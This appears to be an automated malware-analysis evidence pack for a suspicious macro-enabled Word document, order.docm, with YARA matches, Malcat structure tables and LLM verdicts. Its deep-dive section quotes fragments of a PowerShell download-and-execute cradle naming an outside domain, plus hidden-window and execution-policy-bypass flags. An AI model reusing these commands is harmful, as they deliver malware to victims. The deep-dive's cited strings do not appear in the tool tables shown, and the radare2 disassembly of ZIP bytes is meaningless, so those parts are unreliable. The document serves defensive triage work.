# Technical Evidence Pack

**sha256:** 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73  
**sample_path:** /opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm  
**project_name:** test-corpus

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: suspicious
- **score**: 60
- **family_guess**: generic macro malware
- **agreement**: llm_v1_disagree
- **cross_engine_notes**: Ghidra and IDA sessions had errors, so no function or string analysis was available. YARA detected macro indicators and network-related strings. MalCat confirmed the file is an OOXML document with a VBA project binary, but detailed macro content was not extracted. CAPA and FLOSS are not applicable for OOXML files.
- **summary**: The sample is an Office document with macros (.docm) that YARA rules flagged for macro code, base64 encoding, and network indicators (domain and IP). The presence of macros and network strings raises suspicion of malicious intent, such as a dropper or downloader, but definitive behavioral evidence is lacking due to tool errors and limited analysis. No specific malware family was identified.
- **source**: llm_judge
- **model**: configured-llm

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| yara | yara matches | `docx_macro` | Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads. |
| yara | yara matches | `Contains_VBA_macro_code` | Confirms the document contains VBA macro code, supporting the likelihood of executable content. |
| yara | yara matches | `contains_base64` | Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection. |
| yara | yara matches | `domain` | Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration. |
| yara | yara matches | `IP` | IP address string found, suggesting network activity that could be associated with malicious infrastructure. |
| malcat | malcat deep profile | `file_summary` | File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechani |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 90
- **summary**: Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execution. Classic maldoc dropper behavior. Persistence: Not observed. Evasion_anti_analysis: Observed – hidden PowerShell window, execution policy bypass, base64-encoded commands, and use of mshta LOLBin for stealthy execution. {source: 'VBA Payload Analysis', query_or_table: 'PowerShell Execution Commands', row_or_rule: 'HiddenWindow=True, ExecutionPolicy Bypass, EncodedCommand Parameter', why: 'To evade detection by hiding the PowerShell window, bypassing security policies, and obfuscating commands'} Defense_impairment: Not observed. Credential_access: Not observed. Imports: Not observed.

### deep key_evidence
- `"Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech"`
- `"Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payload"`
- `"Malcat rData strings: 'mshta' LOLBin reference for stealthy execution"`
- `"Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)"`
- `"Malcat rData strings: multiple base64-encoded command strings"`
- `"YARA matched rules: docx_macro, office_document_vba, Contains_VBA_macro_code, contains_base64, domain, IP"`
- `"Malcat structure: vbaProject.bin (4985 bytes) + vbaData.xml confirming active macro project"`
- `"File type .docm is macro-enabled Office document, requiring user to enable macros to trigger payload"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73
size: 22771
type: ZIP
architecture: NONE
entropy: 215
file_name: order.docm
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| [Content_Types].xml | 0 | 441 | 441 | 219 | R |
| app.xml | 441 | 498 | 498 | 224 | R |
| core.xml | 939 | 406 | 406 | 222 | R |
| document.xml | 1345 | 1208 | 1208 | 221 | R |
| fontTable.xml | 2553 | 523 | 523 | 218 | R |
| settings.xml | 3076 | 1385 | 1385 | 221 | R |
| styles.xml | 4461 | 3035 | 3035 | 208 | R |
| vbaData.xml | 7496 | 611 | 611 | 225 | R |
| vbaProject.bin | 8107 | 4985 | 4985 | 221 | R |
| webSettings.xml | 13092 | 338 | 338 | 220 | R |
| image1.jpeg | 13430 | 5889 | 5889 | 223 | R |
| theme1.xml | 19319 | 1583 | 1583 | 220 | R |
| document.xml.rels | 20902 | 352 | 352 | 214 | R |
| vbaProject.bin.rels | 21254 | 245 | 245 | 207 | R |
| .rels | 21499 | 274 | 274 | 212 | R |
| <directory> | 21773 | 998 | 998 | 118 | - |

### High-Signal Strings (1 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 17398 | `Hx-=tmq\\` |

### Top Strings (287 extracted; showing 80)
| EA | String |
|---|---|
| 19349 | `word/theme/theme1.xml` |
| 13460 | `word/media/image1.jpeg` |
| 969 | `docProps/core.xml` |
| 8137 | `word/vbaProject.bin` |
| 1375 | `word/document.xml` |
| 471 | `docProps/app.xml` |
| 13122 | `word/webSettings.xml` |
| 7526 | `word/vbaData.xml` |
| 4491 | `word/styles.xml` |
| 3106 | `word/settings.xml` |
| 2583 | `word/fontTable.xml` |
| 20932 | `word/_rels/document.xml.rels` |
| 22588 | `word/_rels/document.xml.relsPK` |
| 22662 | `word/_rels/vbaProject.bin.relsPK` |
| 21284 | `word/_rels/vbaProject.bin.relsm` |
| 22521 | `word/theme/theme1.xmlPK` |
| 8318 | `gggM` |
| 22453 | `word/media/image1.jpegPK` |
| 21529 | `_rels/.rels` |
| 22738 | `_rels/.relsPK` |
| 21946 | `docProps/core.xmlPK` |
| 21884 | `docProps/app.xmlPK` |
| 22322 | `word/vbaProject.binPK` |
| 30 | `[Content_Types].xml` |
| 13657 | `6v.vv.!>` |
| 22387 | `word/webSettings.xmlPK` |
| 22009 | `word/document.xmlPK` |
| 21819 | `[Content_Types].xmlPK` |
| 8832 | `vnnG` |
| 18919 | `uQfQ` |
| 20494 | `n"0n` |
| 3030 | `wYYI` |
| 7217 | `Y77Q` |
| 17224 | `11AP` |
| 14435 | `@<9<` |
| 22260 | `word/vbaData.xmlPK` |
| 22136 | `word/settings.xmlPK` |
| 22072 | `word/fontTable.xmlPK` |
| 15112 | `.p
.h` |
| 22199 | `word/styles.xmlPK` |
| 21392 | `-\Ya;>>` |
| 12574 | `--dY.=R` |
| 13523 | `;3fl3vJ` |
| 17398 | `Hx-=tmq\\` |
| 20678 | `$jM55GMm` |
| 19820 | `d]UEl` |
| 21131 | `d>x
W` |
| 14778 | `wN2F6pM` |
| 9156 | `pU:71E` |
| 13371 | `C?frbx` |
| 19804 | `6ms`:` |
| 9133 | `hnd<KV` |
| 6250 | `DVsTH` |
| 12768 | `uJG
^` |
| 20075 | `Zlvoj]` |
| 8867 | `Z;KR
4O` |
| 6837 | `jHpr5` |
| 13903 | `c.V66 ` |
| 20110 | `TEroJ` |
| 7333 | `U_^?`` |
| 13881 | `nm3wv` |
| 13712 | `s\@=
`e` |
| 20298 | `Jugbx` |
| 4441 | `l<_fK8` |
| 3231 | `b?ULk` |
| 17119 | `/9S=V` |
| 15826 | `mQtxSF<` |
| 16887 | ``HOFl4` |
| 10869 | `d1ksUi` |
| 18393 | `MQ`u0` |
| 12030 | `cb"?i` |
| 15176 | `WLFjm` |
| 10893 | `N
rLk` |
| 21352 | `1tihG` |
| 4924 | `d
^3_` |
| 215 | `qY.mU` |
| 1707 | `oLVmsp` |
| 5501 | `6<"ymxD` |
| 11068 | `)ivv` |
| 8218 | `nHZ0` |

### Virtual Files (15)
| Path / Name | Unpacked Size | Type |
|---|---|---|
| [Content_Types].xml | 1505 | - |
| docProps/app.xml | 982 | - |
| docProps/core.xml | 751 | - |
| word/document.xml | 3907 | - |
| word/fontTable.xml | 1686 | - |
| word/settings.xml | 3701 | - |
| word/styles.xml | 29787 | - |
| word/vbaData.xml | 2310 | - |
| word/vbaProject.bin | 14848 | - |
| word/webSettings.xml | 655 | - |
| word/media/image1.jpeg | 5991 | - |
| word/theme/theme1.xml | 6795 | - |
| word/_rels/document.xml.rels | 1072 | - |
| word/_rels/vbaProject.bin.rels | 277 | - |
| _rels/.rels | 590 | - |

### Structures (31)
| Name | EA |
|---|---|
| LocalFile | 0 |
| LocalFile | 441 |
| LocalFile | 939 |
| LocalFile | 1345 |
| LocalFile | 2553 |
| LocalFile | 3076 |
| LocalFile | 4461 |
| LocalFile | 7496 |
| LocalFile | 8107 |
| LocalFile | 13092 |
| LocalFile | 13430 |
| LocalFile | 19319 |
| LocalFile | 20902 |
| LocalFile | 21254 |
| LocalFile | 21499 |
| CentralDirectory | 21773 |
| CentralDirectory | 21838 |
| CentralDirectory | 21900 |
| CentralDirectory | 21963 |
| CentralDirectory | 22026 |
| CentralDirectory | 22090 |
| CentralDirectory | 22153 |
| CentralDirectory | 22214 |
| CentralDirectory | 22276 |
| CentralDirectory | 22341 |
| CentralDirectory | 22407 |
| CentralDirectory | 22475 |
| CentralDirectory | 22542 |
| CentralDirectory | 22616 |
| CentralDirectory | 22692 |


## capa Capability Rules
engine: `?` · Total rules: 0 · duration_s: ?

| Rule | ATT&CK | MBC |
|---|---|---|

## PE Imports / Signals
import_count: ?

## YARA Matches (pipeline)
Total matches: 6

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| IP | - | $ipv6@7394 len=2 |
| docx_macro | - | $header@0 len=2; $vbaStrings@8137 len=19 |
| contains_base64 | - | $a@471 len=12 |
| Contains_VBA_macro_code | - | $zipmagic@0 len=2; $xmlstr1@8142 len=14; $xmlstr2@7531 len=11 |
| office_document_vba | - | $zipmagic@0 len=2; $xmlstr1@8142 len=14; $xmlstr2@7531 len=11 |

## Generated YARA Meta
```json
{
  "rule_count": 6,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$ipv6",
          "offset": 7394,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "docx_macro",
      "path": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$header",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$vbaStrings",
          "offset": 8137,
          "length": 19,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$a",
          "offset": 471,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Contains_VBA_macro_code",
      "path": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$zipmagic",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$xmlstr1",
          "offset": 8142,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$xmlstr2",
          "offset": 7531,
          "length": 11,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "office_document_vba",
      "path": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$zipmagic",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$xmlstr1",
          "offset": 8142,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$xmlstr2",
          "offset": 7531,
          "length": 11,
          "xor_key": null
        }
      ]
    }
  ],
  "engine": "yara-x",
  "rules_compiled": 454,
  "compile_errors": [
    "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
    "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"
```

## FLOSS Strings
Total strings: 0 · per_category: `{}`

### FLOSS sample

## radare2 Disassembly (attach in Static Code Analysis)
### 0x00000000
```asm
┌ 94: fcn.00000000 (int64_t arg1, int64_t arg4);
│           ; arg int64_t arg1 @ rdi
│           ; arg int64_t arg4 @ rcx
│           0x00000000      50             push rax
│           0x00000001      4b030414       add rax, qword [r12 + r10]
│           0x00000005      0000           add byte [rax], al
│           0x00000007      0008           add byte [rax], cl
│           0x00000009      0000           add byte [rax], al
│           0x0000000b      0021           add byte [rcx], ah          ; arg4
│           0x0000000d      005bc3         add byte [rbx - 0x3d], bl
│           0x00000010      0c0c           or al, 0xc
│           0x00000012      8801           mov byte [rcx], al          ; arg4
│       ╎   0x00000014      0000           add byte [rax], al
│      ┌──< 0x00000016      e105           loope 0x1d
│      │╎   0x00000018      0000           add byte [rax], al
│      │╎   0x0000001a      1300           adc eax, dword [rax]
│      │╎   0x0000001c  ~   0000           add byte [rax], al
│      └──> 0x0000001d      005b43         add byte [rbx + 0x43], bl
│       ╎   0x00000020      6f             outsd dx, dword [rsi]
│       ╎   0x00000021      6e             outsb dx, byte [rsi]
│      ┌──< 0x00000022      7465           je 0x89
│      │╎   0x00000024      6e             outsb dx, byte [rsi]
│     ┌───< 0x00000025      745f           je 0x86
│     ││╎   0x00000027      54             push rsp
│    ┌────< 0x00000028      7970           jns 0x9a
│   ┌─────< 0x0000002a      65735d         jae 0x8a
│ ┌───────< 0x0000002d      2e786d         js 0x9d
│ │╎││││╎   0x00000030      6c             insb byte [rdi], dx
│ │╎││││╎   0x00000031      b554           mov ch, 0x54                ; 'T'
│ │╎││││╎   0x00000033      4b4fc3         ret
..
  │╎││││╎   ; DATA XREF from fcn.00000000 @ 0x31(r)
│ ││││└───> 0x00000086      c5             invalid
..
│ ││││ └──> 0x00000089  ~   b8181d1e0c     mov eax, 0xc1e1d18          ; '\x18\x1d\x1e\f'
│ ││└─────> 0x0000008a      181d1e0c272b   sbb byte [0x2b270cae], bl
│ ││ │      0x00000090      8f             invalid
..
│ ││ └────> 0x0000009a  ~   29a39aa38158   sub dword [rbx + 0x5881a39a], esp ; [0x5881a39a:4]=-1
│ └───────> 0x0000009d      a38158388f..   movabs dword [0xbb52b968f385881], eax ; [0xbb52b968f385881:4]=-1
└       │   0x000000a6      06             invalid
```

## XOR Search
{
  "xorsearch_ok": false,
  "sample": "/opt/samples/corpus/revai-lab-610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "candidates": [],
  "xorsearch_stdout": "",
  "xorsearch_stderr": "",
  "xorsearch_returncode": 1
}
